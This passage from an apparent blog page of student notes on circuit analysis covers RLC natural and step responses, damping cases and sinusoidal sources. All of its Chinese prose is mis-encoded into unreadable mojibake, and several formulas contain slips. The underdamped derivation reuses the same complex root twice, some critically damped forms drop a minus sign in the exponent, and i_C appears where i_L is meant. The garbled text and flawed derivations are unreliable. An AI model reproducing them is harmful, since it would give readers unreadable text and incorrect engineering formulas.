&#x3D; \frac{L_1 L_2 - M^2}{L_1 + L_2 - 2M}}<br>$$</p><h2 id="7-5-æŒ‰åºæ¢è·¯"><a href="#7-5-æŒ‰åºæ¢è·¯" class="headerlink" title="7.5 æŒ‰åºæ¢è·¯"></a>7.5 æŒ‰åºæ¢è·¯</h2><p>ç”µè·¯ä¸­å¦‚æœå‘ç”Ÿå¤šæ¬¡æ¢è·¯, åˆ™ç§°ä¹‹ä¸ºæŒ‰åºæ¢è·¯. (æ¢è·¯, æŒ‡çš„æ˜¯å¦‚, åŒæ·å¼€å…³æ¥å›åˆ‡æ¢, å¤šé‡å¼€å…³æŒ‰é¡ºåºå¼€æˆ–å…³)</p><p>å¯¹äºæŒ‰åºæ¢è·¯é—®é¢˜, <mark>é‡è¦çš„æ˜¯è·å¾—åˆå€¼ $x(t_0)$</mark> , æ¢è·¯æ—¶<mark>ç”µæ„Ÿç”µæµå’Œç”µå®¹ç”µå‹ä¸èƒ½è·ƒå˜</mark>.</p><p>å¦‚, åœ¨ $t &#x3D; 0$ æ—¶, å¼€å…³ 1 æ‰“å¼€, è¿‡äº† 35 ms å, å¼€å…³ 2 æ‰“å¼€. è¿™ç±»é—®é¢˜.</p><p>æ¢è·¯å, åˆå€¼å’Œæ—¶é—´å¸¸æ•°åº”è¯¥éƒ½ä¼šå˜.</p><h2 id="7-6-æ— é™å“åº”"><a href="#7-6-æ— é™å“åº”" class="headerlink" title="7.6 æ— é™å“åº”"></a>7.6 æ— é™å“åº”</h2><p>ä¸€ä¸ªç”µè·¯å“åº”éšæ—¶é—´æŒ‰æŒ‡æ•°è§„å¾‹å¢é•¿è€Œä¸æ˜¯è¡°å‡, è¿™ç§ç±»å‹çš„å“åº”ç§°ä¸º <mark>æ— é™å“åº”</mark>.</p><p>å¦‚æœç”µè·¯å«æœ‰éç‹¬ç«‹æºå¯èƒ½ä¼šå‡ºç°æ— é™å“åº”, æ­¤æ—¶, ç”µæ„Ÿæˆ–ç”µå®¹ç«¯çš„æˆ´ç»´å—ç­‰æ•ˆç”µé˜»å¯ä»¥æ˜¯è´Ÿçš„, è¿™ä¸ªè´Ÿç”µé˜»äº§ç”Ÿä¸€ä¸ªè´Ÿçš„æ—¶é—´å¸¸æ•°, ç»“æœæ˜¯ç”µæµå’Œç”µå‹æ— é™åˆ¶å¢é•¿.</p><p>æ³¨æ„ç¬¬å››ç« çš„æµ‹è¯•ç”µæºæ³•.</p><h2 id="7-7-ç§¯åˆ†æ”¾å¤§å™¨"><a href="#7-7-ç§¯åˆ†æ”¾å¤§å™¨" class="headerlink" title="7.7 ç§¯åˆ†æ”¾å¤§å™¨"></a>7.7 ç§¯åˆ†æ”¾å¤§å™¨</h2><p>å¦‚å›¾:</p><p><img src="/../img/integral_amp_ops.png"></p><p>äº§ç”Ÿä¸€ä¸ªä¸è¾“å…¥ç”µå‹ç§¯åˆ†æˆæ­£æ¯”ä¾‹çš„è¾“å‡ºç”µå‹.</p><p>æš‚æ—¶æ²¡çœ‹.</p><h1 id="ç¬¬8ç« -RLC-ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”"><a href="#ç¬¬8ç« -RLC-ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”" class="headerlink" title="ç¬¬8ç«  RLC ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”"></a>ç¬¬8ç«  RLC ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”</h1><p>éš¾ç‚¹åœ¨äºè§£ <mark>äºŒé˜¶å¾®åˆ†æ–¹ç¨‹</mark>. </p><p>è®¨è®º:</p><ul><li>å¹¶è” RLC ç”µè·¯ (æŒ‡ RLC éƒ½å¹¶è”åœ¨ä¸€èµ·), å­˜å‚¨åœ¨ç”µæ„Ÿ, ç”µå®¹ä¸­çš„èƒ½é‡é‡Šæ”¾å°†åœ¨å¹¶è”æ”¯è·¯ä¸Šäº§ç”Ÿç”µå‹</li><li>ä¸²è” RLC ç”µè·¯ (æŒ‡ RLC éƒ½ä¸²è”åœ¨ä¸€èµ·)</li></ul><p><mark>ä¸ºäº†æ±‚å‡ºå¹¶è”ç”µè·¯çš„å›ºæœ‰å“åº”</mark>, éœ€è¦å…ˆæ±‚å‡ºå¹¶è”æ”¯è·¯çš„ç”µå‹. (æ¯•ç«Ÿå¯¹äºå¹¶è”æ¥è¯´, ç”µå‹æ¯”è¾ƒæ–¹ä¾¿è®¡ç®—)</p><p><img src="/../img/para_RLC_circuit.png"></p><p><mark>ä¸ºäº†æ±‚å‡ºä¸²è”ç”µè·¯çš„å›ºæœ‰å“åº”</mark>, éœ€è¦å…ˆæ±‚å‡ºä¸²è”å…ƒä»¶çš„ç”µæµ. (æ¯•ç«Ÿå¯¹äºä¸²è”æ¥è¯´, ç”µæµæ¯”è¾ƒæ–¹ä¾¿è®¡ç®—), è¿™ä¸€ç”µæµçš„äº§ç”Ÿå–å†³äºåˆå§‹çŠ¶æ€ä¸‹å­˜å‚¨åœ¨ç”µæ„Ÿ, ç”µå®¹ä¸Šçš„èƒ½é‡çš„é‡Šæ”¾.</p><p>(åˆå§‹ç”µæ„Ÿç”µæµ $I_0$ å’Œåˆå§‹ç”µå®¹ç”µå‹ $V_0$ ä»£è¡¨åˆå§‹å­˜å‚¨çš„èƒ½é‡)</p><p>å½“ä¸€ä¸ªç›´æµç”µå‹æºçªç„¶åŠ åˆ°ç”µè·¯ä¸Šåç”µè·¯ä¸­äº§ç”Ÿçš„ç”µæµ, å¼€å…³é—­åˆæ—¶æ˜¯å¦æœ‰èƒ½é‡å­˜å‚¨äºç”µè·¯ä¸­ä¹Ÿè¦çœ‹å…·ä½“çš„ç”µè·¯.</p><p><img src="/../img/seri_RLC_circuit.png"></p><h2 id="8-1-å¹¶è”-RLC-ç”µè·¯å›ºæœ‰å“åº”ç®€ä»‹"><a href="#8-1-å¹¶è”-RLC-ç”µè·¯å›ºæœ‰å“åº”ç®€ä»‹" class="headerlink" title="8.1 å¹¶è” RLC ç”µè·¯å›ºæœ‰å“åº”ç®€ä»‹"></a>8.1 å¹¶è” RLC ç”µè·¯å›ºæœ‰å“åº”ç®€ä»‹</h2><p><img src="/../img/para_RLC_intrinsic_response.png"></p><p>åˆ©ç”¨åŸºå°”éœå¤«ç”µæµå®šå¾‹, è¿™é‡Œæµå‡ºèŠ‚ç‚¹çš„ç”µæµå’Œä¸º 0 (æŒ‰ä¹¦ä¸­ç»™çš„æ¨å¯¼è¿‡ç¨‹æ¥çœ‹å³ä¾§æ˜¯æ–­è·¯):<br>$$<br>\displaylines{ \frac{v}{R} + \frac{1}{L} \int_0^t v d\tau + I_0 + C \frac{dv}{dt} &#x3D; 0 \newline~ \newline<br>}<br>$$</p><p>å¯¹ $t$ å–ä¸€æ¬¡å¾®åˆ†:<br>$$<br>\displaylines{ \frac{1}{R} \frac{dv}{dt} + \frac{v}{L} + C \frac{d^2v}{dt^2} &#x3D; 0}<br>$$<br>(ä» $\frac{1}{L} \int_0^t v d\tau$ å¯ä»¥å¾—çŸ¥ $v$ æ˜¯ $t$ çš„å‡½æ•°, æ­¤æ—¶å¾—åˆ°çš„ä¸ºäºŒé˜¶é½æ¬¡æ–¹ç¨‹)<br>é™¤ä»¥ $C$ :<br>$$<br>\displaylines{\frac{d^2v}{dt^2} + \frac{1}{RC} \frac{dv}{dt} + \frac{v}{LC} &#x3D; 0}<br>$$</p><p>ç”±äºå‡ºç°äº†äºŒæ¬¡å¾®åˆ†, æ‰€ä»¥è¿™ç§ç”µè·¯åˆè¢«ç§°ä¸º<mark>äºŒé˜¶ç”µè·¯</mark>.</p><h3 id="8-1-1-äºŒæ¬¡å¾®åˆ†æ–¹ç¨‹çš„ä¸€èˆ¬è§£æ³•"><a href="#8-1-1-äºŒæ¬¡å¾®åˆ†æ–¹ç¨‹çš„ä¸€èˆ¬è§£æ³•" class="headerlink" title="8.1.1 äºŒæ¬¡å¾®åˆ†æ–¹ç¨‹çš„ä¸€èˆ¬è§£æ³•"></a>8.1.1 äºŒæ¬¡å¾®åˆ†æ–¹ç¨‹çš„ä¸€èˆ¬è§£æ³•</h3><p>è¿™ä¸€èŠ‚ä¸»è¦è®¨è®ºçš„æ˜¯äºŒé˜¶å¾®åˆ†æ–¹ç¨‹çš„è§£æ³•.</p><blockquote><p>å…¸å‹çš„è§£æ³•</p></blockquote><p>å‡è®¾è§£ä¸ºæŒ‡æ•°å½¢å¼:<br>$$<br>\displaylines{v &#x3D; A e^{st}}<br>$$</p><p>($A,\ s$ ä¸ºæœªçŸ¥æ•°)</p><p>ä»£å…¥è§£:<br>$$<br>\displaylines{\frac{d^2v}{dt^2} + \frac{1}{RC} \frac{dv}{dt} + \frac{v}{LC} &#x3D; 0 \newline~ \newline<br>As^2e^{st} + \frac{As}{RC} e^{st} + \frac{Ae^{st}}{LC} &#x3D; 0 \newline~ \newline<br>Ae^{st}(s^2 + \frac{s}{RC} + \frac{1}{LC} &#x3D; 0)<br>}<br>$$</p><p>$e^{st}$ ä¸å¯èƒ½ä¸º 0 , è‹¥ $A &#x3D; 0$, åˆ™ $v &#x3D; Ae^{st}$ åœ¨ä»»ä½•æ—¶åˆ»ä¸ºé›¶ (å½“ç”µæ„Ÿæˆ–ç”µå®¹ä¸­æœ‰èƒ½é‡å­˜å‚¨æ—¶, ç”µå‹ä¸å¯èƒ½ä¸€ç›´ä¸ºé›¶), å› æ­¤åªæœ‰:<br>$$<br>\displaylines{s^2 + \frac{s}{RC} + \frac{1}{LC} &#x3D; 0}<br>$$</p><p>(è¿™ä¸ªå¼å­ä¹Ÿè¢«ç§°ä¸ºå¾®åˆ†æ–¹ç¨‹çš„ç‰¹æ€§æ–¹ç¨‹, ç‰¹æ€§æŒ‡å®ƒå†³å®š $v(t)$ çš„æ•°å­¦ç‰¹æ€§)</p><p>åˆ©ç”¨è§£ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹çš„æ–¹æ³•, å½¢å¦‚ $ax^2 + bx + c &#x3D; 0$ , å…¶è§£ä¸º:<br>$$<br>\displaylines{x_1 &#x3D; \frac{-b + \sqrt{b^2 - 4ac}}{2a} \newline~ \newline<br>x_2 &#x3D; \frac{-b - \sqrt{b^2 - 4ac}}{2a}}<br>$$</p><p>å¾—å‡ºè§£ä¸º:<br>$$<br>\displaylines{s_1 &#x3D; - \frac{1}{2RC} + \sqrt{( \frac{1}{2RC} )^2 - \frac{1}{LC}} \newline~ \newline<br>s_2 &#x3D; - \frac{1}{2RC} - \sqrt{( \frac{1}{2RC} )^2 - \frac{1}{LC}}}<br>$$</p><p>ä¸¤ä¸ªè§£ä¸º (æ³¨æ„ $A$ çš„å€¼):<br>$$<br>\displaylines{v_1 &#x3D; A_1 e^{s_1 t} \newline~ \newline<br>v_2 &#x3D; A_2 e^{s_2 t}}<br>$$</p><p>ç”±äº $v_1, \ v_2$ æ˜¯è§£, $v_1 + v_2$ ä¹Ÿæ˜¯è§£:<br>$$<br>\displaylines{v &#x3D; v_1 + v_2 &#x3D; A_1 e^{s_1 t} + A_2 e^{s_2 t}}<br>$$</p><p>å› æ­¤, å¯ä»¥å¾—åˆ°:<br>$$<br>\displaylines{ \frac{dv}{dt} &#x3D; A_1 s_1 e^{s_1 t} + A_2 s_2 e^{s_2 t} \newline~ \newline<br>\frac{d^2v}{dt^2} &#x3D; A_1 s_1^2 e^{s_1 t} + A_2 s_2^2 e^{s_2 t}}<br>$$</p><p>ä»£å›åŸå¼:<br>$$<br>\displaylines{A_1 e^{s_1 t}(s_1^2 + \frac{1}{RC}s_1 + \frac{1}{LC}) + A_2 e^{s_2 t}(s_2^2 + \frac{1}{RC}s_2 + \frac{1}{LC}) &#x3D; 0}<br>$$</p><p>(æ‹¬å·é‡Œä¸º 0 , å› æ­¤æ–¹ç¨‹æˆç«‹)</p><p>å¯å¾—å‡ºå¹¶è” RLC ç”µè·¯çš„å›ºæœ‰å“åº”ä¸º:<br>$$<br>\displaylines{v &#x3D; A_1 e^{s_1 t} + A_2 e^{s_2 t}}<br>$$</p><p>åŒºåˆ†ä¸¤ä¸ª:</p><ul><li><p>ç‰¹å¾æ–¹ç¨‹æ ¹ $s_1,\ s_2$</p></li><li><p>å¾®åˆ†æ–¹ç¨‹æ ¹ $v_1,\ v_2,\ v_1 + v_2$</p><p><mark>æ±‚è§£å›ºæœ‰å“åº”çš„ç¬¬ä¸€æ­¥</mark> æ˜¯ç¡®å®šç‰¹å¾æ–¹ç¨‹çš„æ ¹:</p></li></ul><p><img src="/../img/get_the_value_of_chara_equation.png"></p><p><mark>æœ¯è¯­åç§°</mark> :</p><ul><li>$s_1,\ s_2$ ç§°ä¸ºå¤é¢‘ç‡</li><li>$\alpha$ ç§°ä¸ºå¥ˆåŸ¹é¢‘ç‡</li><li>$\omega_0$ ç§°ä¸ºè°æŒ¯è§’é¢‘ç‡</li></ul><p>å•ä½éƒ½æ˜¯å¼§åº¦æ¯ç§’ ($rad&#x2F;s$)</p><p>é€šè¿‡ $\alpha$ å’Œ $\omega_0$ çš„å€¼åˆ¤æ–­è¾“å‡º, æœ‰ä¸‰ç§å¯èƒ½çš„è¾“å‡º:</p><ol><li>$\omega_0^2 &lt; \alpha^2$, ä¸¤ä¸ç›¸åŒå®æ ¹, è¿‡é˜»å°¼å“åº” </li><li>$\omega_0^2 &gt; \alpha^2$, ä¸¤æ ¹ä¸ºå¤æ•°ä¸”ä¸ºå…±è½­å¤æ•°, æ¬ é˜»å°¼å“åº”</li><li>$\omega_0^2 &#x3D; \alpha^2$, ä¸¤æ ¹ä¸ºç›¸ç­‰å®æ•°, ä¸´ç•Œé˜»å°¼å“åº”</li></ol><h2 id="8-2-å¹¶è”-RLC-ç”µè·¯å›ºæœ‰å“åº”çš„å½¢å¼"><a href="#8-2-å¹¶è”-RLC-ç”µè·¯å›ºæœ‰å“åº”çš„å½¢å¼" class="headerlink" title="8.2 å¹¶è” RLC ç”µè·¯å›ºæœ‰å“åº”çš„å½¢å¼"></a>8.2 å¹¶è” RLC ç”µè·¯å›ºæœ‰å“åº”çš„å½¢å¼</h2><p>äºŒé˜¶ RLC ç”µè·¯çš„å“åº”å–å†³äº $s_1$ å’Œ $s_2$ çš„å€¼, è€Œ $s_1$ å’Œ $s_2$ åˆå–å†³äºç”µè·¯çš„å‚æ•° $R,\ L,\ å’Œ\ C$.</p><p><mark>æ±‚è§£å›ºæœ‰å“åº”çš„ç¬¬ä¸€æ­¥æ˜¯</mark> å…ˆç¡®å®š $s_1$ å’Œ $s_2$ çš„å€¼, ç„¶åç¡®å®šå“åº”æ˜¯è¿‡é˜»å°¼, æ¬ é˜»å°¼, è¿˜æ˜¯ä¸´ç•Œé˜»å°¼.</p><p>éœ€è¦ç¡®å®š $A_1\ å’Œ\ A_2$ çš„å€¼, åˆ©ç”¨åˆå§‹æ¡ä»¶. (å³, ç”±åˆå§‹çŠ¶æ€å†³å®š, ç”± $v(0^{+})\ å’Œ\ dv(0^{+})&#x2F;dt$ å†³å®š)</p><h3 id="8-2-1-è¿‡é˜»å°¼ç”µå‹å“åº”"><a href="#8-2-1-è¿‡é˜»å°¼ç”µå‹å“åº”" class="headerlink" title="8.2.1 è¿‡é˜»å°¼ç”µå‹å“åº”"></a>8.2.1 è¿‡é˜»å°¼ç”µå‹å“åº”</h3><p>$\omega_0^2 &lt; \alpha^2$, ä¸¤ä¸ç›¸åŒå®æ ¹, è¿‡é˜»å°¼å“åº” </p><p><img src="/../img/steps_to_get_the_value_of_RLC_intrinsic_response.png"></p><blockquote><p>åˆ©ç”¨ç”µå®¹ä¸Šçš„åˆå§‹ç”µå‹å’Œç”µæ„Ÿä¸Šçš„åˆå§‹ç”µæµæ¥ç¡®å®š $A_1\ å’Œ\ A_2$ çš„å€¼ (å·²çŸ¥ $s_1\ å’Œ\ s_2$):</p></blockquote><p><img src="/../img/para_RLC_intrinsic_response.png"></p><p>$$<br>\displaylines{v(0^{+}) &#x3D; A_1 + A_2 \newline~ \newline<br>\frac{dv(0^{+})}{dt} &#x3D; s_1 A_1 + s_2 A_2 \newline~ \newline<br>\frac{dv(0^{+})}{dt} &#x3D; \frac{i_C(0^{+})}{C} \newline~ \newline<br>i_C(0^{+}) &#x3D; \frac{-V_0}{R} - I_0<br>}<br>$$</p><h3 id="8-2-2-æ¬ é˜»å°¼ç”µå‹å“åº”"><a href="#8-2-2-æ¬ é˜»å°¼ç”µå‹å“åº”" class="headerlink" title="8.2.2 æ¬ é˜»å°¼ç”µå‹å“åº”"></a>8.2.2 æ¬ é˜»å°¼ç”µå‹å“åº”</h3><p>$\omega_0^2 &gt; \alpha^2$, ä¸¤æ ¹ä¸ºå¤æ•°ä¸”ä¸ºå…±è½­å¤æ•°, æ¬ é˜»å°¼å“åº”</p><blockquote><p>ä»¤:</p></blockquote><p>$$<br>\displaylines{s_1 &#x3D; - \alpha + \sqrt{-( \omega_0^2 - \alpha^2)} &#x3D; - \alpha + j \sqrt{\omega_0^2 - \alpha^2} &#x3D; -\alpha + j \omega_d \newline~ \newline<br>s_2 &#x3D; - \alpha - j \omega_d \newline~ \newline<br>\omega_d &#x3D; \sqrt{\omega_0^2 - \alpha^2}<br>}<br>$$</p><p>$\omega_d$ ä¸ºé˜»å°¼è§’é¢‘ç‡.</p><p>åˆ©ç”¨æ¬§æ‹‰å˜æ¢:<br>$$<br>\displaylines{e^{\pm j \theta} &#x3D; \cos \theta \pm j\sin \theta}<br>$$</p><p>è§£:<br>$$<br>\displaylines{v(t) &#x3D; A_1 e^{(-\alpha + j\omega_d)t} + A_2 e^{(-\alpha + j\omega_d)t} \newline~ \newline<br>&#x3D; A_1 e^{-\alpha t}e^{j\omega_d t} + A_2 e^{-\alpha t}e^{j\omega_d t} \newline~ \newline<br>&#x3D; e^{-\alpha t}(A_1 \cos \omega_d t + jA_1 \sin\omega_d t + A_2 \cos \omega_d t - jA_2 \sin\omega_d t) \newline~ \newline<br>&#x3D; e^{-\alpha t}[(A_1 + A_2)\cos \omega_d t + j(A_1 - A_2)\sin\omega_dt]<br>}<br>$$</p><p>ç”¨ $B_1,\ B_2$ ä»£æ›¿ $A_1 + A_2$ å’Œ $j(A_1 - A_2)$ å¾—:<br>$$<br>\displaylines{ v &#x3D; B_1 e^{-\alpha t} \cos \omega_d t + B_2 e^{-\alpha t} \sin\omega_dt}<br>$$</p><p><mark>æ¬ é˜»å°¼å“åº”çš„æ€§è´¨</mark>:</p><ul><li>æŒ¯è¡æ€§ (ä¸‰è§’å‡½æ•°å†³å®š), ç”µå‹æŒ¯è¡é¢‘ç‡ä¸ $\omega_d$ æœ‰å…³</li><li>æŒ¯è¡çš„å¹…åº¦ä»¥æŒ‡æ•°å½¢å¼è¡°å‡, è¡°å‡é€Ÿç‡ç”± $\alpha$ å†³å®š</li></ul><h3 id="8-2-3-æ¬ é˜»å°¼å“åº”ç‰¹æ€§"><a href="#8-2-3-æ¬ é˜»å°¼å“åº”ç‰¹æ€§" class="headerlink" title="8.2.3 æ¬ é˜»å°¼å“åº”ç‰¹æ€§"></a>8.2.3 æ¬ é˜»å°¼å“åº”ç‰¹æ€§</h3><p>è§ä¹¦.</p><h3 id="8-2-4-ä¸´ç•Œé˜»å°¼ç”µå‹å“åº”"><a href="#8-2-4-ä¸´ç•Œé˜»å°¼ç”µå‹å“åº”" class="headerlink" title="8.2.4 ä¸´ç•Œé˜»å°¼ç”µå‹å“åº”"></a>8.2.4 ä¸´ç•Œé˜»å°¼ç”µå‹å“åº”</h3><p>$\omega_0^2 &#x3D; \alpha^2$, ä¸¤æ ¹ä¸ºç›¸ç­‰å®æ•°, ä¸´ç•Œé˜»å°¼å“åº”</p><p>ç”±äº:<br>$$<br>\displaylines{s_1 &#x3D; s_2 &#x3D; - \alpha &#x3D; - \frac{1}{2RC}}<br>$$</p><p>ç”µå‹å½¢å¼ç”±:<br>$$<br>\displaylines{v &#x3D; A_1 e^{s_1 t} + A_2 e^{s_2 t}}<br>$$</p><p>å˜ä¸º:<br>$$<br>\displaylines{v(t) &#x3D; D_1 t e^{- \alpha t} + D_2 e^{- \alpha t} }<br>$$</p><p>è”ç«‹:<br>$$<br>\displaylines{v(0^{+}) &#x3D; V_0 &#x3D; D_2 \newline~ \newline<br>\frac{dv(0^{+})}{dt} &#x3D; \frac{i_C(0^{+})}{C} &#x3D; D_1 - \alpha D_2<br>}<br>$$</p><p>å¯è§£å‡º.</p><h2 id="8-3-å¹¶è”-RLC-ç”µè·¯çš„é˜¶è·ƒå“åº”"><a href="#8-3-å¹¶è”-RLC-ç”µè·¯çš„é˜¶è·ƒå“åº”" class="headerlink" title="8.3 å¹¶è” RLC ç”µè·¯çš„é˜¶è·ƒå“åº”"></a>8.3 å¹¶è” RLC ç”µè·¯çš„é˜¶è·ƒå“åº”</h2><p><img src="/../img/para_RLC_circuit_step_response.png"></p><p>æ±‚è§£äºŒé˜¶ç”µè·¯é˜¶è·ƒå“åº”çš„ä¸€èˆ¬æ–¹æ³•, é‡ç‚¹åº”æ±‚è§£ç”µæ„Ÿä¹‹è·¯ä¸Šçš„ç”µæµ ($i_L$)</p><blockquote><p>æ±‚è§£ç”µæ„Ÿç”µæµ $i_L$, åˆ©ç”¨åŸºå°”éœå¤«å®šå¾‹ç”µæµå®šå¾‹</p></blockquote><p>$$<br>\displaylines{i_L + i_R + i_C &#x3D; I, \ i_C &#x3D; C \frac{dv}{dt} \newline~ \newline<br>\therefore i_C + \frac{v}{R} + C \frac{dv}{dt} &#x3D; I \newline~ \newline<br>\because v &#x3D; L \frac{di_L}{dt} \newline~ \newline<br>\therefore \frac{dv}{dt} &#x3D; L \frac{d^2 i_L}{dt^2} \newline~ \newline<br>\therefore i_L + \frac{L}{R} \frac{di_L}{dt} + LC \frac{d^2 i_L}{dt^2} \newline~ \newline<br>\therefore \frac{d^2 i_L}{dt^2} + \frac{1}{RC} \frac{di_L}{dt} + \frac{i_L}{LC} &#x3D; \frac{I}{LC}<br>}<br>$$</p><p>æ±‚å€¼è¿‡ç¨‹è§ä¸‹.</p><h3 id="8-3-1-é—´è§£æ³•"><a href="#8-3-1-é—´è§£æ³•" class="headerlink" title="8.3.1 é—´è§£æ³•"></a>8.3.1 é—´è§£æ³•</h3><p>å…ˆæ±‚ $v$ å†æ±‚ $i$:</p><p>$$<br>\displaylines{i_L + \frac{v}{R} + C \frac{dv}{dt} &#x3D; I,\ \ i_L &#x3D; \frac{1}{L} \int_0^t v d\tau \newline~ \newline<br>\frac{1}{L} \int_0^t v d\tau + \frac{v}{R} + C \frac{dv}{dt} &#x3D; I  \newline~ \newline<br>\frac{v}{L} + \frac{1}{R} \frac{dv}{dt} + C \frac{d^2 v}{dt^2} &#x3D; 0 \newline~ \newline<br>\frac{d^2v}{dt^2} + \frac{1}{RC} \frac{dv}{dt} + \frac{v}{LC} &#x3D; 0<br>}<br>$$</p><p>å¯å¾—åˆ°ä¸‰ç§å¯èƒ½è§£:<br>$$<br>\displaylines{v &#x3D; A_1 e^{s_1 t} + A_2 e^{s_2 t} \newline~ \newline<br>v &#x3D; B_1 e^{- \alpha t} \cos \omega_d t + B_2 e^{- \alpha t} \sin \omega_d t \newline~ \newline<br>v &#x3D; D_1 t e^{- \alpha t} + D_2 e^{- \alpha t}<br>$$</p><p>å°†ä¸Šè¿°è§£ä»£å›:<br>$$<br>\displaylines{i_L + \frac{v}{R} + C \frac{dv}{dt} &#x3D; I}<br>$$</p><p>å¾—åˆ°:<br>$$<br>\displaylines{i_L &#x3D; I + A^\prime_1 e^{s_1 t} + A^\prime_2 e^{s_2 t} \newline~ \newline<br>i_L &#x3D; I + B^\prime_1 e^{- \alpha t} \cos \omega_d t + B^\prime_2 e^{- \alpha t} \sin \omega_d t \newline~ \newline<br>i_L &#x3D; I + D^\prime_1 t e^{\alpha t} + D^\prime_2 e^{- \alpha t}<br>}<br>$$</p><h3 id="8-3-2-ç›´æ¥æ³•"><a href="#8-3-2-ç›´æ¥æ³•" class="headerlink" title="8.3.2 ç›´æ¥æ³•"></a>8.3.2 ç›´æ¥æ³•</h3><p>å…·ä½“è§ä¹¦, ä¸æ˜¯å¾ˆæ‡‚.</p><p>å¸¦å¸¸æ•°çš„äºŒé˜¶å¾®åˆ†æ–¹ç¨‹çš„è§£ç­‰äºä¸€ä¸ªå¼ºåˆ¶å“åº”åŠ ä¸Šä¸€ä¸ªå›ºæœ‰å“åº”, å› æ­¤é˜¶è·ƒå“åº”çš„è§£å¯ä»¥è¡¨ç¤ºä¸º:<br>$$<br>\displaylines{i &#x3D; I_f + \{å›ºæœ‰å“åº”\} \newline~ \newline<br>v &#x3D; V_f + \{å›ºæœ‰å“åº”\}<br>}<br>$$</p><h2 id="8-4-ä¸²è”-RLC-ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”"><a href="#8-4-ä¸²è”-RLC-ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”" class="headerlink" title="8.4 ä¸²è” RLC ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”"></a>8.4 ä¸²è” RLC ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”</h2><p>ä¸²è” RLC ç”µè·¯å’Œå¹¶è” RLC ç”µè·¯å¯ä»¥ç”¨ç›¸åŒå½¢å¼çš„å¾®åˆ†æ–¹ç¨‹æ¥æè¿°, æ‰€ä»¥ä¸¤ç§ç”µè·¯çš„å›ºæœ‰å“åº”å’Œé˜¶è·ƒå“åº”çš„æ±‚è§£è¿‡ç¨‹ç±»ä¼¼.</p><p><img src="/../img/seri_RLC_circuit_intrinsic_response.png"></p><p>åˆ©ç”¨åŸºå°”éœå¤«ç”µå‹å®šå¾‹:<br>$$<br>\displaylines{Ri + L \frac{di}{dt} + \frac{1}{C} \int_0^t i d\tau + V_0 &#x3D; 0 \newline~ \newline<br>R \frac{di}{dt} + L \frac{d^2i}{dt^2} + \frac{i}{C} &#x3D; 0 \newline~ \newline<br>\frac{d^2i}{dt^2} + \frac{R}{L} \frac{di}{dt} + \frac{i}{LC} &#x3D; 0}<br>$$</p><p>å¾—åˆ°ç‰¹å¾æ–¹ç¨‹ä¸º:<br>$$<br>\displaylines{s^2 + \frac{R}{L}s + \frac{1}{LC} &#x3D; 0}<br>$$</p><p>è§£å¾—ç‰¹å¾æ ¹ä¸º:<br>$$<br>\displaylines{s_{1,2} &#x3D; -\alpha \pm \sqrt{\alpha^2 - \omega_0^2}}<br>$$</p><p>å¥ˆåŸ¹é¢‘ç‡çš„å€¼ä¸º:<br>$$<br>\displaylines{\alpha &#x3D; \frac{R}{2L} rad&#x2F;s}<br>$$</p><p>è°æŒ¯è§’é¢‘ç‡ä¸º:<br>$$<br>\displaylines{\omega_0 &#x3D; \frac{1}{\sqrt{LC}} rad&#x2F;s}<br>$$</p><p>åŒæ ·æ ¹æ®:</p><ul><li>$\omega_0^2 &lt; \alpha^2$, è¿‡é˜»å°¼</li><li>$\omega_0^2 &gt; \alpha^2$, æ¬ é˜»å°¼</li><li>$\omega_0^2 &#x3D; \alpha^2$, ä¸´ç•Œé˜»å°¼</li></ul><p>å¾—åˆ°çš„å“åº”å½¢å¼ä¸º:</p><p>$$<br>\displaylines{i(t) &#x3D;  A_1 e^{s_1 t} + A_2 e^{s_2 t}\ (è¿‡é˜»å°¼) \newline~ \newline<br>i(t) &#x3D;  B_1 e^{- \alpha t} \cos \omega_d t + B_2 e^{- \alpha t} \sin \omega_d t \ (æ¬ é˜»å°¼)\newline~ \newline<br>i(t) &#x3D;  D_1 t e^{\alpha t} + D_2 e^{- \alpha t} \ (ä¸´ç•Œé˜»å°¼)<br>}<br>$$</p><h2 id="8-5-åŒé›†æˆè¿æ”¾ç”µè·¯"><a href="#8-5-åŒé›†æˆè¿æ”¾ç”µè·¯" class="headerlink" title="8.5 åŒé›†æˆè¿æ”¾ç”µè·¯"></a>8.5 åŒé›†æˆè¿æ”¾ç”µè·¯</h2><p>è§ä¹¦.</p><h1 id="ç¬¬9ç« -æ­£å¼¦ç¨³æ€åˆ†æ"><a href="#ç¬¬9ç« -æ­£å¼¦ç¨³æ€åˆ†æ" class="headerlink" title="ç¬¬9ç«  æ­£å¼¦ç¨³æ€åˆ†æ"></a>ç¬¬9ç«  æ­£å¼¦ç¨³æ€åˆ†æ</h1><p>æ­£å¼¦ç¨³æ€åˆ†æ, å³åˆ†æç”µå‹æºæˆ–ç”µæµæºæ˜¯æ­£å¼¦å˜åŒ–æ—¶çš„ç”µè·¯.</p><h2 id="9-1-æ­£å¼¦ä¿¡å·æº"><a href="#9-1-æ­£å¼¦ä¿¡å·æº" class="headerlink" title="9.1 æ­£å¼¦ä¿¡å·æº"></a>9.1 æ­£å¼¦ä¿¡å·æº</h2><p><mark>æ­£å¼¦ç”µå‹æº</mark> èƒ½å¤Ÿäº§ç”Ÿéšæ—¶é—´æ­£å¼¦å˜åŒ–çš„ç”µå‹ä¿¡å·.</p><p><mark>æ­£å¼¦ç”µæµæº</mark> èƒ½å¤Ÿäº§ç”Ÿéšæ—¶é—´æ­£å¼¦å˜åŒ–çš„ç”µæµä¿¡å·.</p><p>ä¸€ä¸ªæŒ‰æ­£å¼¦è§„å¾‹å˜åŒ–çš„å‡½æ•°å³å¯ä»¥ç”¨æ­£å¼¦å‡½æ•°è¡¨ç¤ºä¹Ÿå¯ä»¥ç”¨ä½™å¼¦å‡½æ•°è¡¨ç¤º.</p><p>å¦‚:<br>$$<br>\displaylines{v &#x3D; V_m \cos(\omega t + \phi)}<br>$$</p><p>$V_m$ 